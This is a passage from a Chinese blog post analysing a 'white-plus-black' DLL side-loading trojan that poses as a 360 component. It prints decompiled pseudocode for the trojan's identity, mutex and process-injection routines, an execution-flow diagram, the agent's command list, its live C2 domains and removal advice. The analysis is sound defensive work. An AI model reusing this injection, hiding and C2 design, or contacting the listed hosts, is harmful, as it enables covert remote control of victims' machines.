+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;core.transport.failover,core.transport.websocket,core.transport.dns,core.identity.signed_hello,core.heartbeat.ping_p&quot;</span><br><span class="line">    &quot;ong,core.protocol.msgpack,core.transfer.file_upload_v1,system_info.get,diagnostics.get,shell.exec,file_manager.list_&quot;</span><br><span class="line">    &quot;dir,file_manager.stat,file_manager.read_small_file,file_manager.download_file,file_manager.upload,file_manager.creat&quot;</span><br><span class="line">    &quot;e_file,file_manager.mkdir,file_manager.rename,file_manager.delete,persistence.check,persistence.install,persistence.uninstall&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="sub-10015B32"><a href="#sub-10015B32" class="headerlink" title="sub_10015B32"></a>sub_10015B32</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_10015B32</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE MutexA; <span class="comment">// eax</span></span><br><span class="line">  _DWORD v4[<span class="number">4</span>]; <span class="comment">// [esp+Ch] [ebp-194h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+1Ch] [ebp-184h]</span></span><br><span class="line">  _BYTE v6[<span class="number">384</span>]; <span class="comment">// [esp+20h] [ebp-180h] BYREF</span></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(a1: (_BYTE *)a2, a2: <span class="number">0</span>, a3: <span class="number">104</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_10015964(a1: v6) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4[<span class="number">0</span>] = *(_DWORD *)&amp;v6[<span class="number">151</span>];</span><br><span class="line">  v4[<span class="number">1</span>] = *(_DWORD *)&amp;v6[<span class="number">155</span>];</span><br><span class="line">  v4[<span class="number">2</span>] = *(_DWORD *)&amp;v6[<span class="number">159</span>];</span><br><span class="line">  v4[<span class="number">3</span>] = *(_DWORD *)&amp;v6[<span class="number">163</span>];</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  sub_100016E2(a1: <span class="string">&quot;Global\\ProRAM-Agent-&quot;</span>);</span><br><span class="line">  sub_10001776(a1: v4);</span><br><span class="line">  MutexA = CreateMutexA(lpMutexAttributes: nullptr, bInitialOwner: <span class="literal">true</span>, lpName: (LPCSTR)(a2 + <span class="number">8</span>));</span><br><span class="line">  *(_DWORD *)a2 = MutexA;</span><br><span class="line">  <span class="keyword">if</span> ( MutexA == nullptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( GetLastError() == <span class="number">183</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    WriteLogs(lpBuffer: <span class="string">&quot;duplicate_instance&quot;</span>);</span><br><span class="line">    CloseHandle(hObject: *(HANDLE *)a2);</span><br><span class="line">    *(_DWORD *)a2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_10015964</span><span class="params">(<span class="type">int</span> a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v5; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// eax</span></span><br><span class="line">  _DWORD v8[<span class="number">18</span>]; <span class="comment">// [esp+14h] [ebp-22Ch] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">160</span>]; <span class="comment">// [esp+5Ch] [ebp-1E4h] BYREF</span></span><br><span class="line">  _BYTE v10[<span class="number">64</span>]; <span class="comment">// [esp+13Ch] [ebp-104h] BYREF</span></span><br><span class="line">  CHAR Buffer[<span class="number">96</span>]; <span class="comment">// [esp+17Ch] [ebp-C4h] BYREF</span></span><br><span class="line">  _BYTE v12[<span class="number">32</span>]; <span class="comment">// [esp+1DCh] [ebp-64h] BYREF</span></span><br><span class="line">  _BYTE v13[<span class="number">32</span>]; <span class="comment">// [esp+1FCh] [ebp-44h] BYREF</span></span><br><span class="line">  _BYTE v14[<span class="number">36</span>]; <span class="comment">// [esp+21Ch] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0</span> || a3 == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(a1: (_BYTE *)a3, a2: <span class="number">0</span>, a3: <span class="number">384</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == nullptr || *a2 == <span class="number">0</span> )</span><br><span class="line">    a2 = <span class="string">&quot;template-build&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_1001575B(a1: a2, a2: v12) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  sub_1001A126(a1: v12);</span><br><span class="line">  sub_100016E2(a1: v9, a2: <span class="number">0xA0u</span>, a3: <span class="string">&quot;PRO_RAM_AGENT_HELLO_V1:&quot;</span>);</span><br><span class="line">  v5 = sub_1001AF30(a1);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)&amp;sub_1001AF30(a1: (<span class="type">int</span>)v9)[(_DWORD)v5 + <span class="number">1</span>] &gt; <span class="number">0xA0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  sub_10001776(a1);</span><br><span class="line">  v6 = sub_1001AF30(a1: (<span class="type">int</span>)v9);</span><br><span class="line">  sub_1001A17C(a1: v6, a2: v14, a3: v10);</span><br><span class="line">  sub_10015822(a1: a3 + <span class="number">96</span>, a2: <span class="number">48</span>);</span><br><span class="line">  sub_10015822(a1: a3 + <span class="number">288</span>, a2: <span class="number">96</span>);</span><br><span class="line">  sub_10018E93(a1: v13);</span><br><span class="line">  sub_100016E2(a1: (_BYTE *)(a3 + <span class="number">144</span>), a2: <span class="number">0x48u</span>, a3: <span class="string">&quot;sha256:&quot;</span>);</span><br><span class="line">  sub_1001B330(a1: v13, a2: <span class="number">32</span>, a3: a3 + <span class="number">151</span>, a4: <span class="number">65</span>);</span><br><span class="line">  sub_10015191(a1: a3 + <span class="number">216</span>);</span><br><span class="line">  Buffer[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_10014FB0() != <span class="number">0</span> )</span><br><span class="line">    sub_10014F27(lpName: <span class="string">&quot;PRORAM_AGENT_ID&quot;</span>, lpBuffer: Buffer, nSize: <span class="number">0x60u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Buffer[<span class="number">0</span>] != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_100016E2(a1: (_BYTE *)a3, a2: <span class="number">0x60u</span>, a3: Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_1001B330(a1: v13, a2: <span class="number">32</span>, a3: v8, a4: <span class="number">65</span>);</span><br><span class="line">    sub_100016E2(a1: (_BYTE *)a3, a2: <span class="number">0x60u</span>, a3: <span class="string">&quot;agent_c_&quot;</span>);</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">8</span>) = v8[<span class="number">0</span>];</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">12</span>) = v8[<span class="number">1</span>];</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">16</span>) = v8[<span class="number">2</span>];</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">20</span>) = v8[<span class="number">3</span>];</span><br><span class="line">    *(_BYTE *)(a3 + <span class="number">24</span>) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>种子 → 钳位出密钥对 → 签名 <code>PRO_RAM_AGENT_HELLO_V1</code> 身份串并哈希 → 生成 agent_id &#x2F; 公钥 &#x2F; 身份指纹 &#x2F; 主机指纹 &#x2F; 签名，装入 384B 结构。（sub_10015964），存在identity.bin</li>
+<li>它既是启动时互斥体名（<code>Global\ProRAM-Agent-&lt;摘要&gt;</code> 取的就是这里的哈希）的来源，也是每次 C2 握手证明”同一台被控机”的核心材料。</li>
+</ul>
+<h2 id="RestartEXE"><a href="#RestartEXE" class="headerlink" title="RestartEXE"></a>RestartEXE</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">RestartEXE</span><span class="params">(HMODULE hModule)</span></span><br><span class="line">&#123;</span><br><span class="line">  DWORD ModuleFileNameA; <span class="comment">// eax</span></span><br><span class="line">  ModuleFileNameA = GetModuleFileNameA(hModule, lpFilename: &amp;Buffer, nSize: <span class="number">0x104u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ModuleFileNameA == <span class="number">0</span> || ModuleFileNameA &gt;= <span class="number">0x104</span> )</span><br><span class="line">    Buffer = <span class="number">0</span>;</span><br><span class="line">  sub_1001A76A(hModule);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_1001A76A</span><span class="params">(HMODULE hModule)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  result = sub_1001A7F4();</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = _InterlockedCompareExchange(&amp;dword_10021024, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> sub_1001ADE4(lpBuffer: &amp;Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">BOOL __cdecl <span class="title function_">sub_1001ADE4</span><span class="params">(_BYTE *lpBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  CHAR *v3; <span class="comment">// eax</span></span><br><span class="line">  CHAR v4[<span class="number">260</span>]; <span class="comment">// [esp+8h] [ebp-264h] BYREF</span></span><br><span class="line">  CHAR ApplicationName[<span class="number">260</span>]; <span class="comment">// [esp+10Ch] [ebp-160h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+210h] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+254h] [ebp-18h] BYREF</span></span><br><span class="line">  LPCVOID lpBaseAddress; <span class="comment">// [esp+264h] [ebp-8h] BYREF</span></span><br><span class="line">  LPVOID lpAddress; <span class="comment">// [esp+268h] [ebp-4h] BYREF</span></span><br><span class="line">  lpBaseAddress = nullptr;</span><br><span class="line">  lpAddress = nullptr;</span><br><span class="line">  result = sub_1001ADC2(lpFilename: ApplicationName, nSize: <span class="number">0x104u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = sub_1001A993(a1: (<span class="type">int</span>)ApplicationName, a2: (<span class="type">unsigned</span> <span class="type">int</span>)v4, a3: <span class="number">0x104u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a1: &amp;StartupInfo, a2: <span class="number">0</span>, a3: <span class="number">68</span>);</span><br><span class="line">    StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">    <span class="built_in">memset</span>(a1: &amp;ProcessInformation, a2: <span class="number">0</span>, a3: <span class="number">16</span>);</span><br><span class="line">    SetEnvironmentVariableA(lpName: <span class="string">&quot;PRORAM_SL_KEEP&quot;</span>, lpValue: <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    v3 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">0</span> )</span><br><span class="line">      v3 = nullptr;</span><br><span class="line">    <span class="keyword">if</span> ( CreateProcessA(</span><br><span class="line">           lpApplicationName: ApplicationName,</span><br><span class="line">           lpCommandLine: nullptr,</span><br><span class="line">           lpProcessAttributes: nullptr,</span><br><span class="line">           lpThreadAttributes: nullptr,</span><br><span class="line">           bInheritHandles: <span class="literal">false</span>,</span><br><span class="line">           dwCreationFlags: <span class="number">0x9000004u</span>,</span><br><span class="line">           lpEnvironment: nullptr,</span><br><span class="line">           lpCurrentDirectory: v3,</span><br><span class="line">           lpStartupInfo: &amp;StartupInfo,</span><br><span class="line">           lpProcessInformation: &amp;ProcessInformation) )</span><br><span class="line">    &#123;</span><br><span class="line">      SetEnvironmentVariableA(lpName: <span class="string">&quot;PRORAM_SL_KEEP&quot;</span>, lpValue: nullptr);</span><br><span class="line">      <span class="keyword">if</span> ( sub_1001A8EC(hProcess: ProcessInformation.hProcess, a2: (<span class="type">int</span>)&amp;lpBaseAddress) != <span class="number">0</span></span><br><span class="line">        &amp;&amp; sub_1001A81D(hProcess: ProcessInformation.hProcess, lpBaseAddress, a3: (<span class="type">int</span>)&amp;lpAddress) != <span class="number">0</span></span><br><span class="line">        &amp;&amp; sub_1001ABA1(hProcess: ProcessInformation.hProcess, lpAddress) != <span class="number">0</span></span><br><span class="line">        &amp;&amp; ResumeThread(hThread: ProcessInformation.hThread) != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_1001AF4D(hThread: ProcessInformation.hThread, a2: (<span class="type">int</span>)lpAddress, a3: <span class="number">2000</span>);</span><br><span class="line">        <span class="keyword">if</span> ( lpBuffer != nullptr &amp;&amp; *lpBuffer != <span class="number">0</span> )</span><br><span class="line">          sub_1001AC30(hProcess: ProcessInformation.hProcess, lpBuffer);</span><br><span class="line">      &#125;</span><br><span class="line">      CloseHandle(hObject: ProcessInformation.hThread);</span><br><span class="line">      CloseHandle(hObject: ProcessInformation.hProcess);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      SetEnvironmentVariableA(lpName: <span class="string">&quot;PRORAM_SL_KEEP&quot;</span>, lpValue: nullptr);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>就是设置下环境并重启</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>典型的”白加黑”DLL 侧加载木马</li>
+<li><code>360speedld.exe</code>为正常程序</li>
+<li><code>somkernl.dll</code> 名称冒用正版 360 组件，实际为自研 C2 agent</li>
+<li>执行流程</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">360</span>speedld.exe (正版签名)</span><br><span class="line">   └─ LoadLibrary somkernl.dll (同目录劫持)</span><br><span class="line">        └─ DllMain <span class="number">0x1001A334</span></span><br><span class="line">             ├─ 激活判断 <span class="number">0x1001A7D4</span>：</span><br><span class="line">             │    PRORAM_SL_KEEP=<span class="number">1</span> (<span class="number">0x1001A7F4</span>)</span><br><span class="line">             │    或 进程名==<span class="number">360</span>speedld.exe (<span class="number">0x1001A75E</span>)</span><br><span class="line">             │    或 进程名==fixmbr.exe   (<span class="number">0x1001A752</span>)</span><br><span class="line">             ├─[命中] StartHideWindowsWatchdog <span class="number">0x1001A712</span></span><br><span class="line">             │        └─ 线程 <span class="number">0x1001AAA1</span> → EnumWindows：</span><br><span class="line">             │             ShowWindow(SW_HIDE) + 去 WS_EX_APPWINDOW 加 WS_EX_TOOLWINDOW</span><br><span class="line">             │             （前<span class="number">10</span>s每<span class="number">50</span>ms，之后每<span class="number">500</span>ms，宿主界面完全隐身）</span><br><span class="line">             ├─[命中] StartAgentThread <span class="number">0x1001A5E8</span></span><br><span class="line">             │        └─ 线程 <span class="number">0x1001A5DE</span> → AgentMain <span class="number">0x1001A491</span></span><br><span class="line">             └─[非宿主] <span class="number">0x1001A78F</span> 缓存DLL自身路径(<span class="number">0x10021030</span>)</span><br><span class="line">                      → <span class="number">0x1001A76A</span> 自举 → <span class="number">0x1001ADE4</span>：</span><br><span class="line">                          挂起重启宿主(CREATE_SUSPENDED|NO_WINDOW|BREAKAWAY)</span><br><span class="line">                          + 设 PRORAM_SL_KEEP=<span class="number">1</span> 环境变量</span><br><span class="line">                          + <span class="number">0x1001A8EC</span>(NtQueryInformationProcess) / <span class="number">0x1001A81D</span>(远程PE解析)</span><br><span class="line">                          + <span class="number">0x1001AC30</span>: VirtualAllocEx+WriteProcessMemory+</span><br><span class="line">                            CreateRemoteThread(LoadLibraryA, DLL路径)</span><br><span class="line">                          → 子进程激活 agent</span><br><span class="line">        └─ 导出 SomPlugin <span class="number">0x1001A36B</span>：同样拉起 agent；</span><br><span class="line">             若在 <span class="number">360</span>speedld.exe 内 → <span class="number">0x1001A7BD</span> Sleep(<span class="number">60000</span>) 死循环保活宿主</span><br></pre></td></tr></table></figure>
+<ul>
+<li>C2<ul>
+<li>主通道：<code>wss://clash-verge-upgrade.com/edge-af6032129bd933a9/agents/stream</code></li>
+<li>备用通道：<code>dns://d.clash-verge-upgrade.com/poram?http=https://clash-verge-upgrade.com</code>（DNS 隧道）</li>
+</ul>
+</li>
+<li>协议<ul>
+<li>WebSocket RFC6455 + MsgPack</li>
+</ul>
+</li>
+</ul>
+<h1 id="清除建议"><a href="#清除建议" class="headerlink" title="清除建议"></a>清除建议</h1><ol>
+<li>整包按木马处置；<code>360speedld.exe</code> 本身干净（360 正版），但<strong>同目录 DLL 必须删除</strong>，勿单独放行该目录</li>
+<li>检查并清理上述注册表 Run 项与 <code>%ProgramData%\ProRAM</code>、<code>%LOCALAPPDATA%</code> 下的 identity&#x2F;状态文件</li>
+<li>封锁两个 C2 域名的 DNS&#x2F;出网；WSS 443 + DNS 53 需一起查</li>
+<li>若机器曾运行：排查进程树中无窗口的 <code>360speedld.exe</code>、异常 <code>LoadLibrary</code> 注入行为及 <code>fixmbr.exe</code> 落地</li>
+</ol>
+
+  </div>
+
+  
+  <div class="about" data-pagefind-ignore>
+    <h2>关于本文</h2>
+    <div class="details">
+      <p>由 GuQing 撰写，采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a> 许可协议。</p>
+    </div>
+
+    
+  </div>
+  
+
+  
+    
+    <section class="container post-reading-route" data-post-navigation-controls hidden data-pagefind-ignore>
+      <fieldset class="post-reading-route-fieldset">
+        <legend class="post-reading-route-title">
+          <i class="bi bi-signpost-split" aria-hidden="true"></i>
+          <span>阅读线路</span>
+        </legend>
+
+        <div class="post-reading-route-layout">
+          <div class="post-reading-route-copy">
+            <p class="post-reading-route-summary" data-reading-route-summary>沿“样本分析”连续阅读</p>
+            <p class="post-reading-route-hint">选择当前文章所属的标签或分类，并决定上下篇的排列顺序。</p>
+          </div>
+
+          <div class="post-reading-route-controls">
+            <label class="post-reading-route-field" data-reading-route-line-field>
+              <span>线路</span>
+              <select data-reading-route-line aria-describedby="reading-route-status">
+                
+                <optgroup label="按标签">
+                  
+                  <option value="t:样本分析" selected>样本分析</option>
+                  
+                </optgroup>
+                
+                
+                <optgroup label="按分类">
+                  
+                  <option value="c:实战">实战</option>
+                  
+                </optgroup>
+                
+                
+              </select>
+            </label>
+
+            <label class="post-reading-route-field">
+              <span>顺序</span>
+              <select data-reading-route-sort aria-describedby="reading-route-status">
+                
+                <option value="date-desc" selected>最新优先</option>
+                
+                <option value="date-asc">最早优先</option>
+                
+                <option value="title-asc">标题 A→Z</option>
+                
+                <option value="title-desc">标题 Z→A</option>
+                
+              </select>
+            </label>
+          </div>
+        </div>
+
+        <p class="post-reading-route-status" id="reading-route-status" data-reading-route-status aria-live="polite">样本分析 · 第 1 / 1 篇 · 本线路只有这一篇</p>
+      </fieldset>
+    </section>
+    
+
+    <div class="container post-navigation-shell" id="post-navigation" data-pagefind-ignore>
+      <div class="post-prev-next" data-post-navigation>
+        <div class="post-navigation-target previous is-boundary" data-nav-target="previous" aria-disabled="true">
+          <a
+            class="post-navigation-link"
+            data-nav-link
+            hidden
+          >
+            <span class="post-navigation-label"><i class="bi bi-arrow-left" aria-hidden="true"></i>上一篇</span>
+            <span class="post-navigation-title" data-nav-title></span>
+          </a>
+          <div class="post-navigation-boundary" data-nav-boundary>
+            <span class="post-navigation-label"><i class="bi bi-dash-lg" aria-hidden="true"></i>上一篇</span>
+            <span data-nav-boundary-text>本线路只有这一篇</span>
+          </div>
+        </div>
+
+        <div class="post-navigation-target next is-boundary" data-nav-target="next" aria-disabled="true">
+          <a
+            class="post-navigation-link"
+            data-nav-link
+            hidden
+          >
+            <span class="post-navigation-label">下一篇<i class="bi bi-arrow-right" aria-hidden="true"></i></span>
+            <span class="post-navigation-title" data-nav-title></span>
+          </a>
+          <div class="post-navigation-boundary" data-nav-boundary>
+            <span class="post-navigation-label">下一篇<i class="bi bi-dash-lg" aria-hidden="true"></i></span>
+            <span data-nav-boundary-text>本线路只有这一篇</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    
+    <script type="application/json" id="post-navigation-data">{"version":1,"defaultLine":"t:样本分析","defaultSort":"date-desc","contexts":[{"key":"t:样本分析","type":"tag","name":"样本分析","path":"tags/样本分析/","modes":{"date-desc":{"previous":null,"next":null,"position":1,"total":1},"date-asc":{"previous":null,"next":null,"position":1,"total":1},"title-asc":{"previous":null,"next":null,"position":1,"total":1},"title-desc":{"previous":null,"next":null,"position":1,"total":1}}},{"key":"c:实战","type":"category","name":"实战","path":"categories/实战/","modes":{"date-desc":{"previous":null,"next":{"title":"WindowsEvent.exe","path":"2026/09/11/WindowsEvent.exe/","date":"2026-09-10T16:00:00.000Z"},"position":1,"total":2},"date-asc":{"previous":{"title":"WindowsEvent.exe","path":"2026/09/11/WindowsEvent.exe/","date":"2026-09-10T16:00:00.000Z"},"next":null,"position":2,"total":2},"title-asc":{"previous":null,"next":{"title":"WindowsEvent.exe","path":"2026/09/11/WindowsEvent.exe/","date":"2026-09-10T16:00:00.000Z"},"position":1,"total":2},"title-desc":{"previous":{"title":"WindowsEvent.exe","path":"2026/09/11/WindowsEvent.exe/","date":"2026-09-10T16:00:00.000Z"},"next":null,"position":2,"total":2}}}],"labels":{"allPosts":"全部文章","summary":"沿“{name}”连续阅读","position":"{name} · 第 {current} / {total} 篇","atStart":"已到本线路起点","atEnd":"已到本线路终点","onlyOne":"本线路只有这一篇","previousBoundary":"本线路已到起点","nextBoundary":"本线路已到终点","unavailable":"当前阅读线路不可用"}}</script>
+    
+  
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <!-- Footer removed by user request -->
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+
+    
+<script src="/js/custom-effects.js"></script>
+
+
+    
+    
+<script src="/js/lightbox.js"></script>
+
+    
+<script src="/js/content-fold.js"></script>
+
+    
+<script src="/js/post-navigation.js"></script>
+
+    
+
+    
+<script src="/js/hero-stats.js"></script>
+
+
+    
+  </body>
+</html>
